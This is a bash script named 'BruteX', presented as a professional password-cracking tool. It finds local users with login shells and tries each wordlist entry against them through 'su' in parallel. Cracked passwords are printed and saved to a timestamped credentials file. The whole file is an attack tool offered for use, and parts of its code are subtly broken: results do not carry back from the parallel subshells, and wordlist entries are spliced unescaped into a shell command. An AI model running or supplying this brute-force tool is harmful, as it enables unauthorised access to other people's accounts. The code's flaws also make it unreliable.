#!/bin/bash

# Configuration - Colors and Symbols
readonly RED="\033[1;31m"
readonly GREEN="\033[1;32m"
readonly YELLOW="\033[1;33m"
readonly BLUE="\033[1;34m"
readonly CYAN="\033[1;36m"
readonly PURPLE="\033[1;35m"
readonly RESET="\033[0m"

# Custom Symbols
readonly BULLET="🔹"
readonly USER_ICON="👤"
readonly LOCK_ICON="🔒"
readonly FOUND_ICON="✅"
readonly WARNING_ICON="⚠️"
readonly SEARCH_ICON="🔍"
readonly FAIL_ICON="❌"
readonly PROGRESS_ICON="📊"
readonly CLOCK_ICON="⏱️"
readonly CRACKED_ICON="💥"
readonly HAPPY_ICON="😎"
readonly SAD_ICON="😞"

# Global Variables
declare -A compromised_credentials
declare -a interactive_users
DICTIONARY=""
STOP=0
trap ctrl_c INT

function animate_logo() {
  local frames=(
" ██████╗ ██████╗ ██╗   ██╗████████╗███████╗██╗  ██╗"
" ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝╚██╗██╔╝"
" ██████╔╝██████╔╝██║   ██║   ██║   █████╗   ╚███╔╝ "
" ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝   ██╔██╗ "
" ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗██╔╝ ██╗"
" ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝"
  )
  
  clear
  echo -e "${PURPLE}"
  for i in {1..6}; do
    echo "${frames[$i-1]}"
    sleep 0.1
  done
  echo -e "${RESET}"
}

function banner() {
  animate_logo
  echo -e "${YELLOW}                  BruteX - Advanced Password Cracking Tool${RESET}"
  echo -e "${CYAN}             Professional Dictionary Attack Utility by MatthyGD${RESET}\n"
  echo -e "${PURPLE}────────────────────────────────────────────────────────────────────────────────${RESET}"
}

function show_help() {
  echo -e "${BULLET} ${CYAN}Usage:${RESET} ${BLUE}$0 -w <wordlist>${RESET}"
  echo -e "${BULLET} ${CYAN}Options:${RESET}"
  echo -e "  ${BULLET} ${YELLOW}-w${RESET}   Specify wordlist file to use"
  echo -e "  ${BULLET} ${YELLOW}-h${RESET}   Show this help message"
  echo -e "${PURPLE}────────────────────────────────────────────────────────────────────────────────${RESET}"
}

function show_info() {
  echo -e "${BULLET} ${CYAN}Wordlist:${RESET} ${BLUE}${DICTIONARY}${RESET}"
  echo -e "${BULLET} ${CYAN}Wordlist size:${RESET} ${BLUE}$(wc -l < "$DICTIONARY") lines${RESET}"
  echo -e "${BULLET} ${CYAN}Users detected:${RESET} ${BLUE}${#interactive_users[@]}${RESET}"
  echo -e "${PURPLE}────────────────────────────────────────────────────────────────────────────────${RESET}"
}

function ctrl_c() {
  echo -e "\n${WARNING_ICON} ${RED}Interrupt received! Stopping immediately...${RESET}"
  STOP=1
  show_results
  tput cnorm
  exit 1
}

function detect_users() {
  echo -e "${SEARCH_ICON} ${CYAN}Detecting users with interactive shells...${RESET}"
  
  # Robust user detection
  mapfile -t interactive_users < <(getent passwd | awk -F: '$7 ~ /(\/bash|\/sh|\/zsh)$/ {print $1}')
  
  # Fallback detection method
  if [ ${#interactive_users[@]} -eq 0 ]; then
    echo -e "${WARNING_ICON} ${YELLOW}Primary method failed, trying alternative...${RESET}"
    mapfile -t interactive_users < <(getent passwd | awk -F: '$3 >= 1000 && $3 <= 60000 {print $1}' | grep -v '^nobody$')
  fi
  
  if [ ${#interactive_users[@]} -eq 0 ]; then
    echo -e "${FAIL_ICON} ${RED}No users with interactive shells found${RESET}"
    exit 1
  fi
  
  echo -e "\n${LOCK_ICON} ${GREEN}Detected users (${#interactive_users[@]}):${RESET}"
  for user in "${interactive_users[@]}"; do
    shell=$(getent passwd "$user" | cut -d: -f7)
    home=$(getent passwd "$user" | cut -d: -f6)
    echo -e "  ${BULLET} ${USER_ICON} ${CYAN}${user}${RESET}"
    echo -e "     ↳ ${YELLOW}Shell:${RESET} ${BLUE}${shell}${RESET}"
    echo -e "     ↳ ${YELLOW}Home:${RESET} ${BLUE}${home}${RESET}"
  done
  echo -e "${PURPLE}────────────────────────────────────────────────────────────────────────────────${RESET}"
}

function test_credentials() {
  local wordlist=$1
  local total_lines=$(wc -l < "$wordlist")
  local line=0
  local start_time=$(date +%s)
  local num_cores=$(nproc)
  local threads=$((num_cores * 2))  # Use double the available cores
  
  echo -e "\n${SEARCH_ICON} ${YELLOW}Launching BruteX attack...${RESET}"
  echo -e "${PURPLE}────────────────────────────────────────────────────────────────────────────────${RESET}"
  
  # Thread function
  test_thread() {
    local user=$1
    local password=$2
    [ $STOP -eq 1 ] && return
    
    if echo "$password" | timeout 0.1 su "$user" -c 'exit' 2>/dev/null; then
      if [ -z "${compromised_credentials[$user]}" ]; then
        compromised_credentials["$user"]="$password"
        echo -e "\n${FOUND_ICON} ${GREEN}Credentials compromised!${RESET}"
        echo -e "   ${CYAN}User:${RESET} ${BLUE}${user}${RESET}"
        echo -e "   ${CYAN}Password:${RESET} ${GREEN}${password}${RESET}"
        echo -e "   ${CYAN}Time:${RESET} ${BLUE}$(date)${RESET}"
        
        # Exit if all credentials found
        if [ ${#compromised_credentials[@]} -eq ${#interactive_users[@]} ]; then
          STOP=1
        fi
      fi
    fi
  }
  
  # Export required functions and variables
  export -f test_thread
  export STOP
  export compromised_credentials
  
  while IFS= read -r password && [ $STOP -eq 0 ]; do
    line=$((line + 1))
    percentage=$((line * 100 / total_lines))
    
    # Show detailed progress
    elapsed_time=$(( $(date +%s) - start_time ))
    estimated_time=$(( elapsed_time * (total_lines - line) / line )) 2>/dev/null
    eta_formatted=$(printf "%02d:%02d:%02d" $((estimated_time/3600)) $((estimated_time%3600/60)) $((estimated_time%60)))
    
    echo -ne "\r${PROGRESS_ICON} ${CYAN}Progress:${RESET} ${BLUE}${percentage}%${RESET} | ${CYAN}Line:${RESET} ${BLUE}${line}/${total_lines}${RESET} | ${CYAN}ETA:${RESET} ${BLUE}${eta_formatted}${RESET} | ${CYAN}Testing:${RESET} ${YELLOW}${password}${RESET}"
    
    # Parallel processing with xargs
    printf "%s\n" "${interactive_users[@]}" | xargs -P $threads -I {} bash -c 'test_thread "{}" "'"$password"'"'
    
  done < "$wordlist"
  
  echo -e "${PURPLE}────────────────────────────────────────────────────────────────────────────────${RESET}"
}

function show_results() {
  echo -e "\n${LOCK_ICON} ${YELLOW}🔓 FINAL ATTACK SUMMARY 🔓${RESET}"
  echo -e "${PURPLE}────────────────────────────────────────────────────────────────────────────────${RESET}"
  
  if [ ${#compromised_credentials[@]} -gt 0 ]; then
    echo -e "${CRACKED_ICON} ${GREEN}ATTACK SUCCESSFUL!${RESET} ${HAPPY_ICON}"
    echo -e "${CYAN}Compromised credentials found:${RESET} ${GREEN}${#compromised_credentials[@]}${RESET}"
    
    # Create results file
    local results_file="compromised_credentials_$(date +%Y%m%d_%H%M%S).txt"
    {
      echo "╔════════════════════════════════════════╗"
      echo "║    COMPROMISED CREDENTIALS - $(date +"%Y-%m-%d %H:%M:%S") ║"
      echo "╠════════════════════════════════════════╣"
      for user in "${!compromised_credentials[@]}"; do
        echo "║  User: ${user}"
        echo "║  Password: ${compromised_credentials[$user]}"
        echo "╠════════════════════════════════════════╣"
      done
      echo "╚════════════════════════════════════════╝"
    } > "$results_file"
    
    echo -e "\n${BULLET} ${CYAN}Credentials saved to:${RESET} ${BLUE}${results_file}${RESET}"
    
    # Display summary
    for user in "${!compromised_credentials[@]}"; do
      echo -e "  ${FOUND_ICON} ${CYAN}User:${RESET} ${BLUE}${user}${RESET}"
      echo -e "     ${BULLET} ${GREEN}Password:${RESET} ${YELLOW}${compromised_credentials[$user]}${RESET}"
    done
  else
    echo -e "${SAD_ICON} ${YELLOW}No valid credentials found${RESET} ${SAD_ICON}"
    echo -e "${BULLET} ${CYAN}Tested ${BLUE}${line}${CYAN} passwords from ${BLUE}${total_lines}${CYAN} in wordlist${RESET}"
    echo -e "${BULLET} ${CYAN}Users tested:${RESET} ${BLUE}${#interactive_users[@]}${RESET}"
  fi
  
  local remaining=$(( ${#interactive_users[@]} - ${#compromised_credentials[@]} ))
  if [ $remaining -gt 0 ] && [ $STOP -eq 0 ]; then
    echo -e "\n${WARNING_ICON} ${YELLOW}${remaining} users resisted the attack${RESET}"
  elif [ $remaining -gt 0 ]; then
    echo -e "\n${WARNING_ICON} ${YELLOW}Attack interrupted - ${remaining} users not fully tested${RESET}"
  fi
  
  echo -e "${PURPLE}────────────────────────────────────────────────────────────────────────────────${RESET}"
  echo -e "${CLOCK_ICON} ${CYAN}Total execution time:${RESET} ${BLUE}$(date -u -d @$(($(date +%s)-start_time)) +'%H:%M:%S')${RESET}"
  echo -e "${PURPLE}────────────────────────────────────────────────────────────────────────────────${RESET}"
}

# Main Execution
while getopts ":w:h" opt; do
  case $opt in
    w) DICTIONARY="$OPTARG" ;;
    h) banner; show_help; exit 0 ;;
    *) echo -e "${FAIL_ICON} ${RED}Invalid option: -$OPTARG${RESET}"; show_help; exit 1 ;;
  esac
done

if [ -z "$DICTIONARY" ]; then
  banner
  show_help
  exit 0
fi

if [ ! -f "$DICTIONARY" ]; then
  echo -e "${FAIL_ICON} ${RED}Wordlist file not found${RESET}"
  exit 1
fi

banner
detect_users
show_info
test_credentials "$DICTIONARY"
show_results

tput cnorm
